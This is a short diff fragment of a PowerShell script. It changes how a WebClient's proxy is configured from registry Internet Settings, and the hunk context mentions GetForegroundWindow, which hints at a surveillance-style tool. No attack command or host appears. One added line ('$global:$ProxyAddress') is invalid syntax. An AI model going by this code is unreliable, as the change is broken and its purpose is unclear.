@@ -861,8 +861,8 @@ public static extern IntPtr GetForegroundWindow();
 ###########################################################################            
         
 
-            $global:WebClientObject = New-Object System.Net.WebClient
-            $global:WebProxyObject = New-Object System.Net.WebProxy
+            $WebClientObject = New-Object System.Net.WebClient
+            $WebProxyObject = New-Object System.Net.WebProxy
             
        try {
         
@@ -885,10 +885,10 @@ public static extern IntPtr GetForegroundWindow();
             
                 if ($ProxyCheck -eq 1) {
                     Write-Verbose "Proxy configuration found, enabling proxy settings"
-                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
-                    $global:WebProxyObject.Address = $ProxyAddress
-                    $global:WebProxyObject.UseDefaultCredentials = $True
-                    $global:WebClientObject.Proxy = $WebProxyObject
+                    [string] $global:$ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+                    $WebProxyObject.Address = $ProxyAddress
+                    $WebProxyObject.UseDefaultCredentials = $True
+                    $WebClientObject.Proxy = $WebProxyObject
                 }
 
             #Pull the user agent string from the registry
